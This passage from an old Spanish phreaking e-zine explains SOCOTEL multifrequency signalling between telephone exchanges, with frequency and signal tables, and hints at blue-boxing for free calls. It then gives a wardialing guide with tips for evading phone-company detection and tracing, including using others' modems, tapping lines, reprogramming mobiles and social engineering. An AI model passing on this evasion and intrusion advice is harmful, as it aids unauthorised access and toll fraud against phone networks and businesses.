   +----------------+--------------+-------------+----------+----------+
   | Invitacion a   |  - - - - ->  | Continua    | Ausente  | Ausente  |
   | transmitir     |  <- - - - -  |             |          |          |
   +----------------+--------------+-------------+----------+----------+
   | Respuesta      |  - - - - ->  | Continua    | Ausente  | Presente |
   |                |  <---------  |             |          |          |
   +----------------+--------------+-------------+----------+----------+
   | Colgar         |  - - - - ->  | Continua    | Ausente  | Ausente  |
   |                |  <- - - - -  |             |          |          |
   +----------------+--------------+-------------+----------+----------+
   | Desconexion    |  --------->  | Continua    | Presente | Presente |
   |                |  <- - - - -  |             |          | Ausente  |
   +----------------+--------------+-------------+----------+----------+
   | Bloqueo        |  --------->  | Continua    | Presente | Ausente  |
   |                |  <- - - - -  |             |          |          |
   +----------------+--------------+-------------+----------+----------+


SEฅALIZACION DE REGISTRADOR
===========================

    De todos los sistemas de seคalizacion de registrador normalizados, el
usado por la gran mayoria de las empresas de telefonia (Telefonica entre
ellas) en la interconexion de centrales analogicas y algunas digitales es del
tipo multifrecuencia SOCOTEL, con algunas modificaciones. Este sistema sera
desarrollado mas adelante.

    Las seคales que se intercambian las unidades de control de las diversas
centrales que participan en la comunicacion aseguran la transmision de la
informacion referente a la numeracion, ademas del estado de linea del abonado.
Estas seคales solo se usan durante el establecimiento de la comunicacion.

    Las centrales que intervienen en la comunicacion pueden actuar de
diversas maneras, distinguiendose dos tipos de seคalizacion segun la forma en
la que actuen:


       Seคalizacion extremo a extremo
       ------------------------------

       En este sistema, la unidad de control de la primera central que
interviene controla el establecimiento de la comunicacion hasta que sea
completada. A tal efecto, envia a cada una de las unidades de control del
resto de las centrales que intervienen la informacion imprescindible para que
cada una complete la conexion hasta la siguiente central, liberandose a
continuacion.

       +---------------------------------------------------------+
       |   +-----------------------------------+                 |
       |   |   +-------------+                 |                 |
    +--+---+---+--+   +------V------+   +------V------+   +------V------+
    | REGISTRADOR |   | REGISTRADOR |   | REGISTRADOR |   | REGISTRADOR |
    |  DE ORIGEN  |   | DE TRANSITO |   | DE TRANSITO |   |   TERMINAL  |
    +-------------+   +-------------+   +-------------+   +-------------+

       Este sistema presenta las siguientes ventajas:

            * El envio de seคales hacia atras desde la central destino a la
              central origen es posible. Esto permite que en el caso de que
              el abonado llamado este ocupado o la linea este sobrecargada
              la informacion puede ser transmitida directamente desde la
              central origen al abonado llamante, liberandose todos los
              organos que intervienen en la comunicacion.
            * Como la informacion que la unidad de control principal envia al
              resto es minima, se reduce el tiempo usado en esta transmision
              y el tiempo de ocupacion de la unidad de control.


       Seคalizacion tramo a tramo
       --------------------------

       En este caso la unidad de control de la central origen, una vez que
esta conectada con la siguiente central, le entrega a esta ultima toda la
informacion que posee, liberandose a continuacion. Ahora es la segunda
central la encargada de continuar con el establecimiento.

           +---------------+   +-------------+   +---------------+
           |               |   |             |   |               |
    +------+------+   +----V---+----+   +----V---+----+   +------V------+
    | REGISTRADOR |   | REGISTRADOR |   | REGISTRADOR |   | REGISTRADOR |
    |  DE ORIGEN  |   | DE TRANSITO |   | DE TRANSITO |   |   TERMINAL  |
    +-------------+   +-------------+   +-------------+   +-------------+

       Este sistema tambien aporta sus ventajas:

            * Las unidades de control pueden ser de un unico tipo al actuar
              todas de la misma manera. Esto provoca una mayor normalizacion
              de los equipos.
            * El rango dinamico (o de trabajo) de los dispositivos usados en
              la seคalizacion puede ser mas pequeคo, al proceder las seคales
              siempre de la central inmediatamente anterior.
            * Los medios de trasnmision pueden ser mas inestables, pues solo
              influiran en un tramo.
            * Se consigue una mayor fiabilidad al no depender de centrales
              intermedias.
            * La atenuacion de las seคales es menor al recorrer un solo tramo.
              Ergo el ruido es menor.
            * Al ser los tramos independientes entre si, cada uno podra usar
              una seคalizacion distinta a los demas


    Tambien se clasifica la seคalizacion de registrador segun como actuen
los dispositivos implicados en el proceso. Asi tenemos:

            * SEฅALIZACION INTERACTIVA -> Aquella en la que la central de
              origen inicia el envio de una seคal y no lo interrumpe hasta
              que recibe una seคal hacia atras de la otra central confirmando
              la recepcion de la primera seคal. Si se usa seคalizacion
              multifrecuencia, este sistema se conoce como SEฅALIZACION A
              SECUENCIA OBLIGADA.

            * SEฅALIZACION NO INTERACTIVA -> En esta ocasion la central de
              origen envia una seคal y la mantiene durante un tiempo, sin
              esperar confirmacion, pasado el cual retira la seคal. En
              seคalizacion multifrecuencia se conoce como SEฅALIZACION A
              SECUENCIA NO OBLIGADA.


    Y por clasificar que no quede. Podemos tambien clasificarla segun la
secuencia de envio de informacion:

            * SEฅALIZACION EN BLOQUE -> La informacion se transmite en un
              solo bloque compacto. Solo se usa un registrador, pero el
              tiempo de establecimiento aumenta.
            * SEฅALIZACION POR SUPERPOSICION -> Tambien conocida como
              seคalizacion solapada. En este caso la informacion se envia a
              medida que se recibe. Se ocupan varios registradores, aunque se
              reduce el tiempo de establecimiento.
            * SEฅALIZACION COMBINADA -> Es una mezcla de las dos anteriores.
              La informacion recibida se distribuye en grupos y se envia por
              superposicion.


SEฅALIZACION MULTIFRECUENCIA (SOCOTEL MODIFICADO)
=================================================

    ญPor fin! Ya es hora de explicaros el sistema de seคalizacion de
registrador mas usado en todo el mundo (y Espaคa no iba a ser menos).

    En este sistema se envian simultaneamente dos frecuencias distintas
dentro de la banda vocal. Se usan 5 frecuencias distintas mas una frecuencia
de comprobacion. De ahi que a cada una de las seคales usadas para la
seคalizacion se le denomine seคal 2/5.
    El conjunto de frecuencias es:

    f0 = 700 Hz - f1 = 900 Hz - f2 = 1100 Hz - f4 = 1300 Hz - f7 = 1500 Hz

    Con estas frecuencias pueden conseguirse 10 combinaciones distintas, que
se muestran en la tabla siguiente:

        +-------+----------------+-----+-----+------+------+------+
        |CODIGO | VALOR NUMERICO | 700 | 900 | 1100 | 1300 | 1500 |
        +-------+----------------+-----+-----+------+------+------+
        |   1   |     0 + 1      |  X  |  X  |      |      |      |
        |   2   |     0 + 2      |  X  |     |  X   |      |      |
        |   3   |     1 + 2      |     |  X  |  X   |      |      |
        |   4   |     0 + 4      |  X  |     |      |  X   |      |
        |   5   |     1 + 4      |     |  X  |      |  X   |      |
        |   6   |     2 + 4      |     |     |  X   |  X   |      |
        |   7   |     0 + 7      |  X  |     |      |      |  X   |
        |   8   |     1 + 7      |     |  X  |      |      |  X   |
        |   9   |     2 + 7      |     |     |  X   |      |  X   |
        |  10   |     4 + 7      |     |     |      |  X   |  X   |
        +-------+----------------+-----+-----+------+------+------+

    La frecuencia de comprobacion, fc = 1700 Hz, se usa como acuse de recibo
de alguna seคal, bien sea hacia adelante o hacia atras.

    En el sistema SOCOTEL se usa el mecanismo de secuencia obligada, queda
descrito en la siguiente ilustracion.

                        |  |                  ..--''| --> Se envia una seคal
                        |  |            ..--''   |  |     2/5 hacia atras.
                        |  |      ..--''         |  |
                        |  |..--''               |  |
 Se recibe la seคal <-- |  |                     |  |
 2/5. Se responde con   |``--..                  |  |
 el envio de fc.        |  |   ``--..            |  |
                        |  |         ``--..      |  |
                        |  |               ``--..|  |
                        |  |                     |  | --> Se detecta fc. Se
                        |  |                    .  '|     corta el envio de
                        |  |              .  '   |  |     la seคal 2/5.
                        |  |        .  '         |  |
                        |  | .   '               |  |
 Se detecta el corte <- |`   .                   |  |
 de la seคal 2/5. Se    |  |     `  .            |  |
 corta el envio de fc.  |  |           `  .      |  |
                        |  |                 `  .|  |
                        |  |<---- RECEPCION ---->|  |
                        |<-------- EMISION -------->|


    Como puede observarse, el procedimiento es bien simple. Se envia una
seคal MF (2/5), se la contesta con fc tan pronto como se recibe. Nada mas
recibir fc, se corta la emision de la seคal 2/5. Al detectarse el corte en
la emision de la seคal 2/5, se retira fc.
    Y asi hasta que toda la informacion es transmitida.
    Cabe destacar que la secuencia obligada esta controlada por el envio de
fc, pero el programa no permite contestar a fc con otra fc.

    Las seคales utilizadas tienen un significado, que depende del sentido
de las mismas. Asi, distinguimos entre las seคales hacia adelante y las
seคales hacia atras.


       Seคales hacia adelante
       ----------------------

       Dentro de las seคales hacia adelante distinguimos dos grupos: los
Grupos I y II.
       El Grupo I se corresponde con la informacion numerica a transmitir.
       El Grupo II determina el tipo de la llamada a efectuar.

       Existe otro grupo, correspondiente a la Clase de Llamada en el trafico
nacional, que tienen origen en la Central Automatica Interurbana (C.A.I.) de
origen. A este grupo se le denomina prefijo "P". El prefijo se envia delante
del numero significativo nacional como una cifra mas, evitando asi que la
C.A.I. de llegada solicite la Clase de Llamada.

 +-------------+-------+-----------------------+----------------------------+
 | FRECUENCIAS | GRUPO |       GRUPO II        |         PREFIJO "P"        |
 |             |   I   |                       |                            |
 +-------------+-------+-----------------------+----------------------------+
 |  700 +  900 |   1   | Abonado regular       | Reserva                    |
 |  700 + 1100 |   2   | Compartido "b"        | Llamada 3 cifras           |
 |  900 + 1100 |   3   | Servicios especiales  |     "   "    "   con rutas |
 |  700 + 1300 |   4   | Nacional              |     "   4    "             |
 |  900 + 1300 |   5   | Provincial f. sector  |     "   4    "   con rutas |
 | 1100 + 1300 |   6   | Llamada de op. provin.| Reserva                    |
 |  700 + 1500 |   7   | Reserva               | Llamada 8 cifras           |
 |  900 + 1500 |   8   | Abonado ausente       |    "    "   "    con rutas |
 | 1100 + 1500 |   9   | Reserva               | Reserva                    |
 | 1300 + 1500 |   0   | Internacional         | Llamada internacional      |
 +-------------+-------+-----------------------+----------------------------+

       La descripcion de las seคales es como sigue:

       * Grupo I - Informacion numerica.
       * Grupo II - Clase de Llamada (C.LL.).
            * II-1 -> Abonado regular. La llamada va dirigida a un abonado de
                      la red principal que se encuentra en la central origen.
            * II-2 -> Abonado compartido "b". Llamada con destino a un abonado
                      compartido "b".
            * II-3 -> Servicios especiales. Llamada dirigida a servicios
                      especiales dentro de la provincia.
            * II-4 -> Nacional. Llamada que se origina en un provincia y tiene
                      otra como destino.
            * II-5 -> Provincia fuera de sector. Llamada origina en un sector
                      de una red provincial y dirigida a otro sector de la
                      misma red provincial que no precisa peticion de cifras.
            * II-6 -> Llamada de operadora a operadora de la misma privincia.
                      Llamada originada por una operadora y dirigida a otra
                      de su red provincial con el fin de alcanzar por medio
                      de esta un abonado de dicha red.
            * II-7 -> Reserva.
            * II-8 -> Abonado ausente. Llamada originada por el abonado con
                      la categoria de abonado ausente. La comunicacion sera
                      dirigida hacia una posicion de operadora donde sera
                      atendida. El abonado no precisa marcar ninguna cifra.
            * II-9 -> Reserva.
            * II-10 -> Internacional. El mismo nombre lo indica, จno?
                       (Al son de la internacional...)
       * Grupo de Prefijo "P".
            * P-1 -> Reserva.
            * P-2 -> Llamada dirigida a una operadora cuyo numero consta de
                     3 cifras y no tiene posibilidad de rutas alternativas.
            * P-3 -> Idem P-2, pero con rutas alternativas.
            * P-4 -> Idem P-2, pero con 4 cifras.
            * P-5 -> Idem P-3, pero con 4 cifras.
            * P-6 -> Reserva.
            * P-7 -> Idem P-2, pero con 8 cifras.
            * P-8 -> Idem P-3, pero con 8 cifras.
            * P-9 -> Reserva.
            * P-10 -> Llamada internacional.


       Seคales hacia atras
       -------------------

       Estas seคales se clasifican en dos grupos o codigos llamados A y B. Las
seคales correspondientes al Codigo A son relativas a la seleccion, mientras
que las correspondientes al Codigo B se refieren a la condicion o categoria
de la linea alcanzada.
       Las seคales de codigo B han de ir siempre precedidas de una seคal de
codigo A (A-8).
       La central que reciba una seคal no utilizada la interpretara como
seคal erronea. Debido a esto, enviara hacia adelante la seคal de desconexion,
mandando al abonado que llama el tono de congestion. (จOs suena esto de algo?)

    +-------------+-------------------------+---------------------------+
    | FRECUENCIAS |        CODIGO A         |          CODIGO B         |
    +-------------+-------------------------+---------------------------+
    |  700 +  900 | Enviar grupo A          | Abonado libre con computo |
    |  700 + 1100 | Enviar grupo B          | Congestion                |
    |  900 + 1100 | Enviar clase llamada    | Abonado ausente           |
    |  700 + 1300 | Enviar grupo BC         | Abonado ocupado           |
    |  900 + 1300 | Enviar grupo D          | Abonado libre sin computo |
    | 1100 + 1300 | Enviar todas las cifras | Llamada maliciosa         |
    |  700 + 1500 | Enviar grupo C          | Numero cambiado           |
    |  900 + 1500 | Paso a codigo B         | Linea muerta              |
    | 1100 + 1500 | Enviar grupo E          | Fin de selecciขn sin      |
    |             |                         | estado de lกnea alcanzada |
    | 1300 + 1500 | Congestion              | Reserva                   |
    +-------------+-------------------------+---------------------------+

       Para obtener una mayor flexibilidad, el numero de abonado es dividido
en grupos de cifras. Asi se consigue un menor numero de peticiones distintas
por parte de la central de llegada. Esto deriva en un tiempo de seleccion mas
corto. Segun el tipo de llamada, el numero de abonado llamado se forma en
alguno de los siguientes modos:

            * Llamadas interurbanas cuando el numero significativo consta de
              ocho cifras: XYABMCDU
            * Seleccion entre centrales automaticas interurbanas: PXYABMCDU
            * Llamadas locales y provinciales cuyo numero significativo consta
              de YABMCDU en areas de numeracion a siete cifras y de ABMCDU en
              areas de numeracion a seis cifras.

                         +---------+-----------+-----------------------+
                         | Prefijo |  Prefijo  |   Numero provincial   |
                         | interpr | provincial|                       |
                         +---------+-----+-----+---+---+---+---+---+---+
                         |    P    |  X  |  Y  | A | B | M | C | D | U |
    +--------------------+---------+-----+-----+---+---+---+---+---+---+
    | Grupo A nacional   |         |  X  |  Y  | A | B | M |   |   |   |
    +--------------------+---------+-----+-----+---+---+---+---+---+---+
    | Grupo A provincial |         |     |  Y  | A | B | M |   |   |   |
    |                    |         |     |     | A | B | M |   |   |   |
    +--------------------+---------+-----+-----+---+---+---+---+---+---+
    | Grupo B            |         |     |     |   | B | M |   |   |   |
    +--------------------+---------+-----+-----+---+---+---+---+---+---+
    | Grupo C            |         |     |     |   |   |   | C | D | U |
    +--------------------+---------+-----+-----+---+---+---+---+---+---+
    | Grupo BC           |         |     |     |   | B | M | C | D | U |
    +--------------------+---------+-----+-----+---+---+---+---+---+---+
    | Grupo D            |    P    |  X  |  Y  | A | B |   |   |   |   |
    +--------------------+---------+-----+-----+---+---+---+---+---+---+
    | Grupo E            |         |     |     |   |   | M | C | D | U |
    +--------------------+---------+-----+-----+---+---+---+---+---+---+

       En esta tabla observamos los diferentes grupos de cifras que pueden
formarse. Pasemos ahora a explicar el significado de las seคales que
pertenecen al Codigo A:

            * A-1 -> Enviar grupo de cifras A. Este grupo de cifras puede
                     observarse en la tabla anterior. A los grupos A de cifras
                     que aparecen, se le aคaden:

                         - OXY -> Las tres cifras de servicios especiales.
                         - OX y OXY -> Las 2 o 3 cifras que componen el
                                       servicio de Operadora de Asistencia.
                         - XYA y XYAB -> Las cifras que componen la numeracion
                                         de Operadora de Asistencia y/o los
                                         Servicios Especiales Nacionales.

                     El resto de los grupos A quedan explicados con la tabla,
                     vamos, creo yo ;)
            * A-2 -> Enviar grupo de cifras B. A este grupo de cifras, ademas
                     de las cifras mencionadas en la tabla, cabe aคadir el
                     grupo:

                         - XY -> En llamadas a Servicios Especiales de la
                                 Provincia de 3 cifras, en redes de numeracion
                                 a 6 cifras.
            * A-3 -> Enviar clase de llamada. Seคal a la que se debe responder
                     con una seคal del Grupo II de las seคales hacia delante.
            * A-4 -> Enviar grupo de cifras BC. (No Coment).
            * A-5 -> Enviar grupo de cifras D. Se envia el grupo D o todas las
                     cifras que componen la numeracion de Operadora
                     Asistencial Nacional.
            * A-6 -> Enviar todas las cifras. En llamadas internacionales.
            * A-7 -> Enviar grupo de cifras C. (No Coment).
            * A-8 -> Paso a codigo B. Cuando se recibe esta seคal, todas las
                     seคales hacia atras que sigan tendran significado de
                     Codigo B.
            * A-9 -> Enviar grupo de cifras E. (No Coment).
            * A-10 -> Congestion. Indica la imposibilidad de establecer la
                      comunicacion por ocupacion o fallo de alguno de los
                      organos que participan de la misma.


       Las seคales de Codigo B solo tienen significado si se ha recibido
previamente la seคal A-8. Este su siginificado:

            * B-1 -> Abonado libre con computo. Indica que se ha alcanzado al
                     abonado llamado y que debe tarificarse la llamada. Abarca
                     las categorias de abonados regulares, compartidos y de
                     previo pago (telefonos publicos). (จP'a que podra servir
                     esto? =:) )
            * B-2 -> Congestion. Idem A-10.
            * B-3 -> Abonado ausente. Categoria especial del abonado llamado
                     por la cual se pone en comunicacion con una operadora o
                     informacion grabada al abonado llamante.
            * B-4 -> Abonado ocupado. Indica que el abonado llamado tiene el
                     telefono descolgado. Tambien se usa cuando la central
                     destino tiene congestion y no posee medios para
                     distinguir estas dos seคales.
            * B-5 -> Abonado libre sin computo. Indica que se ha alcanzado el
                     abonado llamado y que no debe tarificarse la
                     comunicacion. (ญAja!)
            * B-6 -> Abonado conectado a llamada maliciosa. Si se recibe esta
                     seคal, entonces el abonado llamado tiene categoria de
                     Observacion de Llamadas Maliciosas. Esto no es mas que
                     el abonado llamado solicita el numero del abonado que
                     llama.
            * B-7 -> Numero cambiado. Solo se envia cuando la llamada tiene
                     que reencaminarse hacia un enlace especial en origen.
            * B-8 -> Linea muerta o Nivel muerto. Se envia esta seคal cuando
                     la numeracion se dirige a un nivel aun no en servicio o
                     cuando la linea no esta utilizada.
            * B-9 -> Fin de seleccion sin estado de linea alcanzada. Se envia
                     esta seคal cuando no se puede enviar el estado de la
                     linea alcanzada.
            * B-10 -> En reserva.


EJEMPLO PRACTICO
================

    Ahora veamos como se produce una llamada realmente, entre las centrales,
cuando por ejemplo llamamos a alguien de nuestra misma ciudad. En este ejemplo
se supone una ciudad donde el numero de telefono consta de 7 cifras.


             Recepcion A3    <-----------  Envio de A3  (Peticion C.LL.)
             Envio fc        ----------->  Recepcion fc (Retirada de A3)

             Envio de C.LL.  ----------->  Repcion C.LL.
             Recepcion fc    <-----------  Envio fc

             Recepcion A1    <-----------  Envio A1 (Peticion Grupo A)
             Envio fc        ----------->  Recepcion fc

             Envio cifra Y   ----------->  Recepcion cifra Y
             Repcepcion fc   <-----------  Envio fc
             Envio cifra A   ----------->  Recepcion cifra A
             Repcepcion fc   <-----------  Envio fc
             Envio cifra B   ----------->  Recepcion cifra B
             Repcepcion fc   <-----------  Envio fc
             Envio cifra M   ----------->  Recepcion cifra M
             Repcepcion fc   <-----------  Envio fc

             Recepcion A7    <-----------  Envio A7 (Peticion Grupo C)
             Envio fc        ----------->  Recepcion fc

             Envio cifra C   ----------->  Recepcion cifra C
             Repcepcion fc   <-----------  Envio fc
             Envio cifra D   ----------->  Recepcion cifra D
             Repcepcion fc   <-----------  Envio fc
             Envio cifra U   ----------->  Recepcion cifra U
             Repcepcion fc   <-----------  Envio fc

             Recepcion A8    <-----------  Envio A8 (Paso a Codigo B)
             Envio fc        ----------->  Recepcion fc

             Recepcion S.B.  <-----------  Envio de seคal del Codigo B
             Envio fc        ----------->  Recepcion fc


    En este ejemplo hemos de tener en cuenta que se procede segun el mecanismo
de secuencia obligada. Asi, se envia una seคal (hacia atras o hacia adelante,
lo mismo da) y no se retira hasta recibir el acuse de recibo fc. Y fc no se
retira hasta que no se retire la seคal original.
    Ahora surgen unas preguntas: จQue pasaria si la seคal del codigo B fuese
B-5? จTendriamos una blue-box? Y de ser asi, จcomo se diseคa, como se usa y
donde hay que pincharla?

    Si habeis seguido bien los articulos de RTC, ya deberiais conocer las
respuestas. Debeis saber que en Espaคa se esta implantando la seคalizacion
por canal comun entre las centrales. Esto quiere decir que no se puede
intervenir desde vuestra casa los canales de seคalizacion, por estar separados
del canal de comunicacion. จO si se puede? El tiempo lo dira.


Y POR ULTIMO
============

    Los que conozcais otros textos under sobre telefonia os habreis dado
cuenta que el fichero ese que ha aparecido en otras ezines sobre la blue box
no puede funcionar. Primero porque estan mal las frecuencias usadas por el
SOCOTEL. Segundo, porque el metodo descrito no se corresponde con el
funcionamiento de las centrales telefonicas. Y tercero, จcomo demonios pincho
una central?

    De momento esto ha sido todo sobre la RTC. Espero vuestras dudas,
sugerencias, opiniones y demas cosas que querais contarme en las direcciones
e-mail abajo indicadas.

    (ญUf! Toy cansao. Hala, a dormir)

                           ___________.___ _______   
                           \_   _____/|   |\      \  
                            |    __)  |   |/   |   \ 
                            |     \   |   /    |    \
                            \___  /   |___\____|__  /
                                \/                \/ 

                                   Have P/Hun
                               El Profesor Falken
                          profesor_falken@hotmail.com
                            prf_falken@geocities.com






ษอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออป
บ 06. ESCANEO DE LINEAS EN ESPAฅA V.2                                       บ
ศอออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออผ


 
 Escaneo de lineas en ESPAฅA 
=============================
 Primera Ampliacion (30-6-97) por El Duke de Sicilia
======================================================
 

Este texto no es una simple correccion o modificacion del texto original 
escrito por Eljaker. El texto ha sido ampliado, completado y se le han aคadido 
nuevas secciones. La reforma es tal que el tamaคo del texto se ha triplicado 
y la informacion tecnica es mucho mas abundante. Se han eliminado tambien la 
mayoria de las incorrecciones y se han aclarado las dudas mas comunes. En 
resumen es un texto nuevo.


Introduccion: 
-------------

El escaneo de lineas telefonicas o wardialing consiste en llamar (por 
telefono) a un conjunto de numeros. Esto sirve para localizar CARRIERS, VMBs,
PBXs, faxes, numeros especiales, etc... con diversos objetivos.

Para ello se usan programas que llaman automaticamente a los numeros que les 
indiques y se encargan de localizar y apuntar todos los numeros de telefono
donde aparezca algo interesante. Estos programas se llaman auto-dialers, 
war-dialers, daemon-dialers, discadores, etc... La palabra war-dialer es la 
mas usada y viene de la pelicula "Juegos de Guerra" (war-games-dialer) en la 
que se podia ver como el protagonista hacia un escaneo de lineas.

Aunque tambien se puede hacer con la antigua tecnica de marcar a mano todos 
los numeros. Algo un poco lento y muy cansado. (Aunque si se hace desde una 
cabina es la forma mas segura)

Hay distintos modelos de war-dialers cada uno con unas caracteristicas 
diferentes, pero basicamente todos hacen lo mismo: 
-Se encargan de llamar a un gran numero de numeros automaticamente, cosa que 
seria muy molesta de realizar a mano, y localizar y anotar todos los numeros 
donde aparezca algo que nos interese.

Hay varios war-dialers en el mercado, pero de los que he probado los que mas 
me han gustado han sido el Toneloc programado por Muchos Maas y Minor Threat 
y el THC-SCAN programado por Van Hauser (Grupo The Hacker Choice), sobre todo 
este ultimo es buenisimo con una cantidad enorme de posibles configuraciones 
y con unas caracteristicas tecnicas envidiables y ademas es 'made in UE'. 

Tambien podeis haceros uno vosotros mismos, es bastante facil, e incluso lo 
podeis hacer mediante los scripts que llevan algunos programas de 
comunicaciones como el telix. Aunque nunca conseguireis tantas opciones como 
con el THC-SCAN. 


ESPAฅA, Panorama general: 
-------------------------
        
La verdad es que el escaneo de lineas en Espaคa y en la mayoria de los paises 
avanzados se ha puesto muy dificil debido a la implantacion generalizada de 
sistemas digitales por las compaคias telefonicas. Todavia quedan algunos 
paises donde se hace un uso habitual de los war-dialers, sobre todo en 
aquellos con una larga tradicion hacker, como USA, UK o Alemania, pero 
incluso en estos paises el escaneo se esta viendo perjudicado.
        
Aunque en la mayoria de los paises el escaneo de lineas no esta penado por la 
ley, en la mayor parte de los casos, las compaคias telefonicas mediante su 
reglamento interno o mediante avisos impide o dificulta el libre escaneo.
        
Asi, en Espaคa debido a la dureza de la Telefonica y a la falta de 'tradicion 
hacker' se practica muy poco esta actividad. Otra razon tambien importante es 
la falta de informacion sobre estos temas, por eso pretendemos en este 
articulo, aclarar este interesante tema y completar y ampliar la informacion 
que se dio en su primera entrega.

Pero la situacion no es tan negativa, al contrario de lo que la gente piensa
Espaคa no esta tan atrasada informaticamente. El numero de modems y demas
maquinas conectadas al telefono no llega a los niveles de USA pero es muy
alto. Incluso pequeคas empresas, colegios, institutos, etc... tienen ya
modems. Es sorprendente la cantidad de cosas que pueden encontrarse y la
facilidad con la que se hace si se sabe donde buscar.


Tecnicas de las compaคias telefonicas para localizar escaneos:
--------------------------------------------------------------

Sobre este tema se podrian escribir muchos articulos, y tal vez me decida a 
escribir yo alguno, pero mientras lo hago y para que os vayais haciendo una 
idea de lo que hace telefonica para localizar escaneos, aqui va un pequeคo 
resumen:

Como he dicho la implantacion de los sistemas digitales en la red telefonica
ha hecho que esta actividad se vea perjudicada. Algunos se preguntaran porque,
...pues la razon es sencilla, estos sistemas digitales llevan asociados una 
red de ordenadores que se encarga de monitorizar y vigilar todo el trafico de 
la red telefonica. Estos ordenadores estan conectados dia y noche controlando
todo el trafico telefonico y avisando cuando pasa algo sospechoso.

Esto no quiere decir que escuchen nuestras conversaciones privadas o que
pinchen nuetras comunicaciones... ya que esto seria ilegal y seria algo
dificil de llevar a cabo incluso por un ordenador. Esto quiere decir que
los ordenadores estan programados con una serie de esquemas prefijados que 
indican que tipo de llamadas se salen de lo normal. Si alguna llamada sigue 
uno de estos esquemas, salta la "alarma" y los tecnicos de telefonica son 
notificados de ello.

Estas son algunos de los tipos de llamadas que hacen saltar los logs
de telefonica: (Seguramente habra mas...)
-->Llamadas de larga duracion.
-->Llamadas desde un numero infacturable. (Por ejemplo un numero inexistente)
-->Estas son para localizar escaneos principalmnete-->
        -Muchas llamadas a numeros 900s o gratuitos.
        -Repeticion de llamadas desde o hacia el mismo numero.
        -Repeticion de llamadas desde el mismo area hacia otros numeros.
        -Repeticion de llamadas desde un mismo numero a telefonos del mismo 
        area.
-->Llamar a numeros especiales, no solo los numeros 900s estan vigilados, 
tambien lo estan los 902, 906, infovia (055), los numeros especiales de
3 cifras (XXX) como el 004, 025, etc...

Consecuencias:
*Tal vez os hayais preguntado por que en Espaคa hay tan pocas BBS warez
mientras que en USA hay tantas... Esta es una de las razones...
*Si no se toman las medidas oportunas el escaneo de lineas es facilmente
detectado.
*Se acabaron los acosadores telefonicos.
*Se localizan facilmente negocios o actividades poco legales... no solo
relacionadas con el phreaking, sino otras muchas... Ya han caido traficantes,
camellos, empresas de economia sumergida, prostibulos y un largo etcetera.
Todos ellos localizados gracias a un numero de telefono particular que 
recibia demasiadas llamadas para pasar desapercibido... (Ya se que parecen 
cosas de pelicula pero son reales)


Escaneo seguro y efectivo:
--------------------------

Y ya que hemos visto lo que hace telefonica para vigilarnos ahora toca 
enumerar una serie tecnicas para evitar o hacer mas dificil que nos pillen
escaneando y algunos consejos para tener mas exito:

-La norma basica del phreaker/hacker es usar telefono "limpio" que no tenga
la mas minima relacion contigo. Si cumples esta norma, seguramente podras
librarte de complicadas estrategias.

-Si nadie coge el telefono cuando llames seguramente tu escaneo pasara mas 
desapercibio (Aunque no para los ordenadores de telefonica que nunca duermen) 
Para hacer que nadie excepto una maquina coja el telefono estos son algunos 
consejos:
-->Escanea a altas horas de la madrugada.
-->Por la noche suele haber mas modems, VMB o PBX que durante el dia son
sustituidos por telefonistas o recepcionistas.
-->Configura el war-dialer para que cuelgue a los pocos tonos (2 o 3) ten en 
cuenta que la mayoria de los modems cogen la llamada tras el primer tono.
-->Hazlo en fines de semana o en periodos vacacionales cuando escanees zonas 
empresariales o comerciales.
-->Estudia bien la zona a escanear. No pierdas el tiempo escaneando tu
vecindario ya que seguramente no encontraras ningun modem. Escanea zonas
empresariales o comerciales donde habra mas modems.

-Cumple las reglas basicas del hacking, se discreto, no abuses, ten 
paciencia...

-Configura el war-dialer para que no llame de una forma lineal, de una forma 
secuencial, sino que lo haga de una forma pseudo-aleatoria. Esto no evita los 
nuevos sistemas de deteccion, pero puede servir en sistemas antiguos o para 
despistar a los tecnicos de telefonica.

-No escanes mucho tiempo seguido ni un numero alto. Como he explicado antes, 
los controles de telefonica saltan tras un numero determinado de llamadas 
sospechosas. Asi que no abuses.

-Deja espacios grandes de tiempo entre escaneos, no escanees a diario ni a 
horas fijas.

-Utiliza algun truco para evitar ser traceado. La cuestion aqui es encontrar
un sistema para evitar el traceo y que no nos salga ni muy caro ni sea poco 
disimulado. Desgraciadamente este tipo de sistemas son muy escasos y 
delicados y es mejor reservarlos para ocasiones especiales. Algunos trucos
para no ser traceado son:
-->Utilizar algun modem ajeno (por ejemplo el de algun unix) para hacer un
outdial.
-->Utilizar algun tipo de diverter o puente. Aunque en Espaคa son muy escasos 
y es mejor no abusar de ellos.
-->Pinchar alguna linea. Poco recomendable si se quiere permanecer sin
antecedentes policiales.
-->Si se tienen conocimientos suficientes de telefonia reprogramar algun
movil... tiene los mismos inconvenientes que el metodo anterior.

-Investiga antes de empezar. Estudiate la guia telefonica y busca zonas
interesantes: 
-->Los numeros consecutivos suelen pertenecer a una misma zona geografica o
comercial.
-->Los organismos publicos usan zonas propias (Es decir sus numeros de 
telefono empiezan siempre igual)
-->Las grandes empresas suelen ocupar zonas enteras, con decenas de numeros.
De esta manera es facil encontar el sitio apropiado donde buscar.
-->Si la empresa es antigua, los modems y faxes habran sido instalados varios 
aคos despues de que fuesen instalados los telefonos de voz y por lo tanto sus 
numeros generalmente ya no estaran en la misma zona que los telefonos 
antiguos, sino que seran numeros mas nuevos.
-->Como los modems, faxes, PBXs, y demas maquinas suelen instalarse despues
de los telefonos de voz, y tambien suelen haber sido conectados en la misma
epoca, pues suelen tener numeros consecutivos o proximos. Esto implica que si 
localizas algun modem o fax, seguramente habra mas en numeros contiguos. Y
tambien implica que este tipo de aparatos suele estar situado en los ultimos
numeros de la zona o con un numero posterior a los telefonos de voz.
-->Cuando las empresas renuevan sus equipos informaticos, instalan nuevos 
modems y suelen poner numeros nuevos. Solo es cuestion de buscar alguna 
empresa que anuncie un cambio de su numero de atencion al publico por ejemplo, 
y escanear los numeros contiguos (anteriores y posteriores) y tendras exito 
con una gran probabilidad.
-->Las grandes empresas, los organismos oficiales, las universidades, suelen
tener mas modems y PBXs. Estos seran nuestros principales objetivos.

-La ingenieria social tambien funciona muy bien a la hora de investigar 
y de buscar modems:
-->Buscate amigos en empresas de instalacion de equipos informaticos o en 
telefonica, siempre acabaran por hablar de algo.
-->Al mismo tiempo que escaneas, y con un poco de atrevimiento, si sale una
voz, puedes preguntar a que numero has llamado. Intenta localizar las
oficinas o el departamento de informatica y entonces habras encontrado el
modem.

